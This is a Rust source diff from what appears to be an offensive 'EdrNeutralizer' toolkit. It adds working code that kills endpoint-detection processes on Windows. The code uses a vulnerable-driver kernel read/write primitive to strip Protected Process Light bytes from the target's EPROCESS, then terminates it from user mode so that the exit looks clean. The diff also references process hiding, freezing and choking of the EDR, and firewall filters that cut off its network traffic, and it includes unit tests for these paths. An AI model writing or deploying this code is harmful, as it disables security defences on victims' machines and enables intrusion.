+        unsafe { crate::win::resolve::resolve_sym(b"kernel32.dll", b"TerminateProcess") }
+            .map_err(|_| KitError::Other("TerminateProcess unresolved".into()))?;
+    let close_handle: CloseHandleFn =
+        unsafe { crate::win::resolve::resolve_sym(b"kernel32.dll", b"CloseHandle") }
+            .map_err(|_| KitError::Other("CloseHandle unresolved".into()))?;
+
+    let h_process = unsafe { open_process(PROCESS_TERMINATE, 0, pid) };
+    if h_process.is_null() {
+        return Err(KitError::Other(format!(
+            "OpenProcess(PROCESS_TERMINATE) failed for pid {} after PPL strip — \
+             access denied (no SeDebugPrivilege?) or the process already exited",
+            pid
+        )));
+    }
+    // Exit code 0 (STATUS_SUCCESS) — the EDR dies looking like a clean exit.
+    let ok = unsafe { terminate_process(h_process, 0) };
+    let _ = unsafe { close_handle(h_process) };
+    if ok == 0 {
+        return Err(KitError::Other(format!(
+            "TerminateProcess failed for pid {} after PPL strip",
+            pid
+        )));
+    }
+    Ok(())
+}
+
+#[cfg(not(target_os = "windows"))]
+fn terminate_process_user_mode(_pid: u32) -> Result<(), KitError> {
+    Err(KitError::UnsupportedPosture(
+        "user-mode TerminateProcess is Windows-only",
+    ))
+}
+
 impl EdrNeutralizer {
-    /// Kill an EDR PPL process via kernel-mode ZwTerminateProcess.
-    ///
-    /// # Algorithm
-    /// 1. Walk `PsActiveProcessHead` → find target `EPROCESS` by PID
-    ///    (uses `ProcessHider::find_eprocess` — real, kernel R/W).
-    /// 2. The operator's driver wraps `ZwTerminateProcess`:
-    ///    `ObOpenObjectByPointer(eprocess, …)` → handle
-    ///    `ZwTerminateProcess(handle, STATUS_SUCCESS)`
-    ///
-    /// Steps 2 is driver-side (operator-bound). This method resolves the
-    /// EPROCESS address; the actual termination depends on the BYOVD driver
-    /// supporting a terminate IOCTL, or the operator using `PplStripper` to
-    /// strip PPL first and then terminating from user-mode.
-    ///
-    /// For R/W-only drivers (RTCore64), the recommended path is:
-    /// `PplStripper::strip_protection` → user-mode `TerminateProcess`.
-    pub fn kill(&self, krw: &dyn KernelRw, pid: u32) -> Result<usize, KitError> {
+    /// Resolve the target process's `EPROCESS` KVA by walking
+    /// `PsActiveProcessHead` (via `ProcessHider::find_eprocess` — real kernel
+    /// R/W). This is the resolution half of the Kill tier, kept public for
+    /// operators whose driver exposes a native terminate IOCTL
+    /// (`ObOpenObjectByPointer` + `ZwTerminateProcess`) and only need the KVA.
+    pub fn resolve_target_eprocess(
+        &self,
+        krw: &dyn KernelRw,
+        pid: u32,
+    ) -> Result<usize, KitError> {
         if self.ps_active_process_head_kva == 0 {
             return Err(KitError::UnsupportedPosture(
                 "PsActiveProcessHead KVA unresolved for Kill tier — \
                  bootstrap must fill EdrNeutralizer.ps_active_process_head_kva",
             ));
         }
-        let eprocess_kva =
-            ProcessHider::find_eprocess(krw, self.ps_active_process_head_kva, pid, &self.offsets)?;
-        // EPROCESS resolved. Return the KVA so the operator can:
-        //   a) Pass it to a driver's terminate IOCTL (ObOpenObjectByPointer + ZwTerminateProcess), or
-        //   b) Use PplStripper to strip PPL, then TerminateProcess from user-mode.
-        Ok(eprocess_kva)
+        ProcessHider::find_eprocess(krw, self.ps_active_process_head_kva, pid, &self.offsets)
+    }
+
+    /// Kill an EDR (PPL) process. **This really terminates the target** — it
+    /// does not just resolve an address and hand off.
+    ///
+    /// # Why not a pure data-write kill
+    ///
+    /// With only `kread`/`kwrite` + resolved offsets there is no *sound*
+    /// write-only termination:
+    /// - NULLing `EPROCESS.Token` crashes the KERNEL, not the process: access
+    ///   checks (`SeAccessCheck` via `PsReferencePrimaryToken`) dereference the
+    ///   token — a NULL token is a ring-0 NULL-deref → BSOD. Forbidden.
+    /// - Corrupting `DirectoryTableBase` faults the next context switch into
+    ///   any thread of the target with a garbage CR3; the page-fault handler
+    ///   itself then can't be fetched → double fault → BSOD. Forbidden.
+    /// - Unlinking `ActiveProcessLinks` (DKOM) only HIDES the process; its
+    ///   threads keep running — that is `ProcessHider`, not a kill.
+    /// - `PspTerminateProcess` via a queued kernel APC needs a code-execution
+    ///   primitive the `KernelRw` contract deliberately excludes (HVCI-safe
+    ///   data-write doctrine).
+    ///
+    /// # What this does instead (strongest sound version)
+    ///
+    /// 1. Walk `PsActiveProcessHead` → target `EPROCESS` by PID.
+    /// 2. Snapshot + strip PPL: zero `Protection` / `SignatureLevel` /
+    ///    `SectionSignatureLevel` (data-only, HVCI-safe — same writes as
+    ///    `PplStripper`, with rollback bytes captured).
+    /// 3. User-mode `OpenProcess(PROCESS_TERMINATE)` + `TerminateProcess` —
+    ///    now unblocked because the process is no longer protected.
+    /// 4. On any failure of step 3, **roll the protection bytes back** and
+    ///    return the terminate error (a failed Kill never leaves the EDR
+    ///    silently unprotected). On success the EPROCESS is being torn down by
+    ///    the kernel, so the strip is intentionally left in place.
+    ///
+    /// Returns the (now-dying) target's `EPROCESS` KVA for operator logging.
+    pub fn kill(&self, krw: &dyn KernelRw, pid: u32) -> Result<usize, KitError> {
+        let eprocess_kva = self.resolve_target_eprocess(krw, pid)?;
+        let snapshot = ProtectionSnapshot::strip(krw, eprocess_kva, &self.offsets)?;
+        match terminate_process_user_mode(pid) {
+            Ok(()) => Ok(eprocess_kva),
+            Err(term_err) => match snapshot.restore(krw, eprocess_kva, &self.offsets) {
+                // Rollback OK: surface the terminate failure.
+                Ok(()) => Err(term_err),
+                // Worst case: neither the kill nor the rollback completed —
+                // the target is alive but unprotected. Say so explicitly.
+                Err(rb_err) => Err(KitError::Other(format!(
+                    "Kill failed ({}) AND protection rollback failed ({}) — \
+                     pid {} is left ALIVE with PPL stripped; re-run or restore manually",
+                    term_err, rb_err, pid
+                ))),
+            },
+        }
     }
 }
 
@@ -754,15 +1196,16 @@ impl EdrNeutralizeKit for EdrNeutralizer {
     }
 
     fn neutralize(&self, _pid: u32, m: NeutralizeMethod) -> Result<(), KitError> {
-        // Note: the trait doesn't pass a KernelRw. For Kill, the operator
-        // should call `EdrNeutralizer::kill(krw, pid)` directly, which
-        // returns the target EPROCESS KVA for the driver to terminate.
+        // Note: the trait doesn't pass a KernelRw. Kill needs one (to strip
+        // PPL before the user-mode terminate), so it lives on
+        // `EdrNeutralizer::kill(krw, pid)`; a bare user-mode terminate attempt
+        // here would falsely "fail" on every protected target.
         // Freeze + Choke are user-mode tiers (operator wires the FFI).
         match m {
             NeutralizeMethod::Kill => Err(KitError::UnsupportedPosture(
-                "Kill: use EdrNeutralizer::kill(krw, pid) directly — the trait \
-                 has no KernelRw param; kill() resolves EPROCESS for the driver's \
-                 terminate IOCTL or PplStripper + user-mode TerminateProcess path",
+                "Kill: use EdrNeutralizer::kill(krw, pid) directly — the trait has no \
+                 KernelRw param; kill() strips PPL via kernel data writes and then \
+                 terminates from user mode (with protection rollback on failure)",
             )),
             NeutralizeMethod::Freeze => freeze_edr_coma(_pid),
             NeutralizeMethod::Choke => choke_edr_qos(_pid),
@@ -1135,6 +1578,79 @@ mod tests {
         assert!(res.is_err());
     }
 
+    // ---- WFP ALE_APP_ID condition/filter shape (P0-9 fix) ------------------
+    //
+    // The condition + filter construction is pure data (no FFI), so the exact
+    // byte-level shape the Windows path hands to FwpmFilterAdd0 is locked down
+    // on the host. The Windows-only plumbing (pid→image path→AppId, RAII
+    // blob free, real FwpmFilterAdd0) is verified on-target.
+
+    #[test]
+    fn wfp_guids_match_windows_sdk() {
+        // FWPM_LAYER_ALE_AUTH_CONNECT_V4 {c38d57d1-05a7-4c33-904f-7fbceee60e82}
+        assert_eq!(
+            LAYER_ALE_AUTH_CONNECT_V4.0,
+            [
+                0xD1, 0x57, 0x8D, 0xC3, 0xA7, 0x05, 0x33, 0x4C, 0x90, 0x4F, 0x7F, 0xBC, 0xEE, 0xE6,
+                0x0E, 0x82,
+            ]
+        );
+        // FWPM_CONDITION_ALE_APP_ID {d78e1e87-8644-4ea5-9437-d809ecefc971}
+        assert_eq!(
+            CONDITION_ALE_APP_ID.0,
+            [
+                0x87, 0x1E, 0x8E, 0xD7, 0x44, 0x86, 0xA5, 0x4E, 0x94, 0x37, 0xD8, 0x09, 0xEC, 0xEF,
+                0xC9, 0x71,
+            ]
+        );
+    }
+
+    #[test]
+    fn wfp_struct_layouts_match_sdk_x64() {
+        // Sizes pin the repr(C) layouts against the SDK (x64): a field-order
+        // or alignment regression would shift every offset FwpmFilterAdd0 reads.
+        assert_eq!(core::mem::size_of::<FwpByteBlob>(), 16);
+        assert_eq!(core::mem::size_of::<FwpConditionValue0>(), 16);
+        assert_eq!(core::mem::size_of::<FwpmFilterCondition0>(), 40);
+        assert_eq!(core::mem::size_of::<FwpmFilter0>(), 200);
+    }
+
+    #[test]
+    fn wfp_app_id_condition_shape() {
+        let mut blob = FwpByteBlob {
+            size: 8,
+            data: 0x1000 as *mut u8,
+        };
+        let cond = ale_app_id_condition(&mut blob);
+        assert_eq!(cond.field_key, CONDITION_ALE_APP_ID);
+        assert_eq!(cond.match_type, FWP_MATCH_EQUAL);
+        assert_eq!(cond.condition_value.value_type, FWP_BYTE_BLOB_TYPE);
+        assert_eq!(cond.condition_value.byte_blob, &mut blob as *mut FwpByteBlob);
+    }
+
+    #[test]
+    fn wfp_block_filter_has_exactly_one_condition() {
+        // P0-9 regression: the filter must ALWAYS carry exactly one
+        // ALE_APP_ID condition. num_filter_conditions=0 would match ALL
+        // outbound IPv4 traffic on the host — the constructor below is the
+        // only one that exists, and it hard-wires 1.
+        let mut blob = FwpByteBlob {
+            size: 4,
+            data: core::ptr::null_mut(),
+        };
+        let cond = ale_app_id_condition(&mut blob);
+        let filter = FwpmFilter0::block_outbound_app_id(&cond);
+        assert_eq!(filter.num_filter_conditions, 1);
+        assert_eq!(
+            filter.filter_conditions,
+            &cond as *const FwpmFilterCondition0
+        );
+        assert_eq!(filter.layer_key, LAYER_ALE_AUTH_CONNECT_V4);
+        assert_eq!(filter.action_type, FWP_ACTION_BLOCK);
+        assert_eq!(filter.flags, 0); // never PERSISTENT — session-scoped
+        assert_eq!(filter.weight_type, 0); // FWP_EMPTY → auto weight
+    }
+
     #[test]
     fn directory_table_base_is_early_field() {
         // DTB is a near-zero offset field; sanity-pin it so a future "drift"
@@ -1183,9 +1699,19 @@ mod tests {
     /// Set up a mock process list with two EPROCESSes (PID 100 @ 0x5000,
     /// PID 200 @ 0x6000) and a DTB at DIRECTORY_TABLE_BASE offset.
     fn setup_process_list(krw: &MockKrw, offsets: &crate::offsets::EprocessOffsets) {
-        let head = 0x1000usize;
-        let e1 = 0x5000usize;
-        let e2 = 0x6000usize;
+        setup_process_list_at(krw, offsets, 0x1000, 0x5000, 0x6000);
+    }
+
+    /// Address-parameterized variant: `ProtectionSnapshot::strip` refuses
+    /// non-canonical EPROCESS KVAs, so tests that exercise the strip path
+    /// (EdrNeutralizer::kill) must place the list in kernel space.
+    fn setup_process_list_at(
+        krw: &MockKrw,
+        offsets: &crate::offsets::EprocessOffsets,
+        head: usize,
+        e1: usize,
+        e2: usize,
+    ) {
         let l1 = e1 + offsets.active_process_links;
         let l2 = e2 + offsets.active_process_links;
         krw.set_u64(head, l1 as u64);
@@ -1204,15 +1730,37 @@ mod tests {
     fn edr_neutralizer_kill_finds_eprocess() {
         let krw = MockKrw::new();
         let offsets = test_offsets();
-        setup_process_list(&krw, &offsets);
+        // Canonical kernel KVAs — strip() refuses non-canonical EPROCESS
+        // addresses (a corrupt find_eprocess result must never be written to).
+        let head = 0xFFFF_8000_0000_1000usize;
+        let e1 = 0xFFFF_8000_0000_5000usize;
+        let e2 = 0xFFFF_8000_0000_6000usize;
+        setup_process_list_at(&krw, &offsets, head, e1, e2);
         let kit = EdrNeutralizer {
-            ps_active_process_head_kva: 0x1000,
+            ps_active_process_head_kva: head,
             offsets,
         };
-        // PID 100 → EPROCESS at 0x5000.
-        assert_eq!(kit.kill(&krw, 100).unwrap(), 0x5000);
-        // PID 200 → EPROCESS at 0x6000.
-        assert_eq!(kit.kill(&krw, 200).unwrap(), 0x6000);
+        #[cfg(target_os = "windows")]
+        {
+            // PID 100 → EPROCESS at e1.
+            assert_eq!(kit.kill(&krw, 100).unwrap(), e1);
+            // PID 200 → EPROCESS at e2.
+            assert_eq!(kit.kill(&krw, 200).unwrap(), e2);
+        }
+        #[cfg(not(target_os = "windows"))]
+        {
+            // TerminateProcess is Windows-only: kill() strips PPL, the
+            // user-mode terminate fails, and the protection bytes MUST be
+            // rolled back (a failed Kill never leaves the target unprotected).
+            let mut b = [0x61u8];
+            krw.kwrite(e1 + offsets.protection, &b).unwrap();
+            assert!(matches!(
+                kit.kill(&krw, 100),
+                Err(KitError::UnsupportedPosture(_))
+            ));
+            krw.kread(e1 + offsets.protection, &mut b).unwrap();
+            assert_eq!(b[0], 0x61, "failed kill must roll back the PPL strip");
+        }
         // PID 999 → NotFound.
         assert!(matches!(kit.kill(&krw, 999), Err(KitError::NotFound)));
     }
